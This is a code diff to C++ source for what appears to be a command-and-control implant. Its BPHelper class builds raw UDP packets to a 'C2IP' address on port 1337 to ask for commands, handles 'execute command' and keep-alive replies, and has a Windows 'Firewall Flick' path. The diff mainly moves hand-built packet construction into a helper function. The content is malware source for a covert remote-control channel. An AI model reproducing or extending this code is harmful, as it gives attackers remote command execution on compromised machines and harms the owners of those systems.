@@ -8,15 +8,15 @@ int BPHelper::actionResponse(unique_ptr<info_t> eventInfo) {
         case 0x02:
             //execute command then respond
             cout << "Received a Command to Execute" << endl;
-            if(eventInfo->bpRawCommand.command_num == currentCmd){
+            if (eventInfo->bpRawCommand.command_num == currentCmd) {
                 currentCmd++;
             }
             return 1;
         case 0x04:
             //keep alive for future use
             cout << "Received a Keep Alive" << endl;
-            if(eventInfo->bpKeepAlive.command_num == currentCmd){
-                currentCmd ++;
+            if (eventInfo->bpKeepAlive.command_num == currentCmd) {
+                currentCmd++;
             }
             return 1;
         default:
@@ -26,62 +26,17 @@ int BPHelper::actionResponse(unique_ptr<info_t> eventInfo) {
 }
 
 void BPHelper::requestAction() {
-    ether_header_t ether_header{};
-    ip_header_t ip_header{};
-    udp_header_t udp_header{};
     bp_header_t bpHeader{};
     bp_command_request_t bp_command_request_header{};
-
     bpHeader.header_type = 0x01;
-
     bp_command_request_header.target_OS = 0x01;
     bp_command_request_header.command_num = htonl(currentCmd);
 
-    uint16_t udp_len = (uint16_t) sizeof(bpHeader) + (uint16_t) sizeof(bp_command_request_header) +
-                       (uint16_t) sizeof(udp_header);
-    udp_header.length = htons(udp_len);
-    udp_header.dst_port = htons(1337);
-    udp_header.src_port = htons(1337);
-    udp_header.checksum = htons(0xFFFF);
-
-    ip_header.ver_ihl = 0x45;
-    ip_header.total_length = htons(udp_len + (uint16_t) sizeof(ip_header));
-    ip_header.id = htons(0xda80);
-    ip_header.flags_fo = htons(0x4000);
-    ip_header.ttl = 0x80;
-    ip_header.protocol = 0x11;
-    ip_header.checksum = htons(0x0000);
-    ip_header.tos = 0x00;
-    ip_header.src_addr = rawSocket.getIP();
-    ip_header.dst_addr = htonl(C2IP);
-
-#ifdef __unix__
-    memcpy(ether_header.dst_mac, nextHopMac.data(), 6);
-    memcpy(ether_header.src_mac, rawSocket.getMac(), 6);
-    ether_header.type = htons(0x0800);
-    auto ether_ptr = reinterpret_cast<unsigned char *>(&ether_header);
-#endif
-
-    auto ip_ptr = reinterpret_cast<unsigned char *>(&ip_header);
-    auto udp_ptr = reinterpret_cast<unsigned char *>(&udp_header);
     auto bp_header_ptr = reinterpret_cast<unsigned char *>(&bpHeader);
     auto bp_ptr = reinterpret_cast<unsigned char *>(&bp_command_request_header);
 
-    vector<uint8_t> tempIP(ip_ptr, ip_ptr + sizeof(ip_header));
-    ip_header.checksum = CalculateIPChecksum(tempIP);
-
-    vector<uint8_t> tempUDP(udp_ptr, udp_ptr + sizeof(udp_header));
-    udp_header.checksum = CalculateUDPChecksum(tempUDP, ip_header.src_addr, ip_header.dst_addr);
-
-#ifdef __unix__
-    Packet req(ether_ptr, ether_ptr + sizeof(ether_header));
-    req.insert(req.end(), ip_ptr, ip_ptr + sizeof(ip_header));
-#else
-    Packet req(ip_ptr, ip_ptr + sizeof(ip_header));
-#endif
-    req.insert(req.end(), udp_ptr, udp_ptr + sizeof(udp_header));
-    req.insert(req.end(), bp_header_ptr, bp_header_ptr + sizeof(bpHeader));
-    req.insert(req.end(), bp_ptr, bp_ptr + sizeof(bp_command_request_header));
+    vector<uint8_t> payload(bp_header_ptr, bp_header_ptr + sizeof(bpHeader));
+    payload.insert(payload.end(), bp_ptr, bp_ptr + sizeof(bp_command_request_header));
 
 #if defined(_WIN32) || defined(WIN32)
     //Firewall Flick
@@ -89,6 +44,13 @@ void BPHelper::requestAction() {
     rawSocket.send(req);
     socketMutex.unlock();
 #else
+    vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
+                                         C2IP,
+                                         1337,
+                                         1337,
+                                         payload,
+                                         rawSocket.getMac(),
+                                         nextHopMac);
     socketMutex.lock();
     rawSocket.send(req);
     socketMutex.unlock();
@@ -97,11 +59,11 @@ void BPHelper::requestAction() {
 
 BPHelper::BPHelper() {
 #ifdef __unix__
-    rawSocket = RawSocket(C2IPSTR, false, true);
+    rawSocket = RawSocket(C2IP);
     if (useGateway) {
         nextHopMac = rawSocket.getMacOfIP(GatewayIP);
     } else {
-        nextHopMac = rawSocket.getMacOfIP(C2IP);
+        nextHopMac = rawSocket.getMacOfIP(ntohl(C2IP));
     }
 #elif defined(_WIN32) || defined(WIN32)
     rawSocket = RawSocket(C2IP, false);
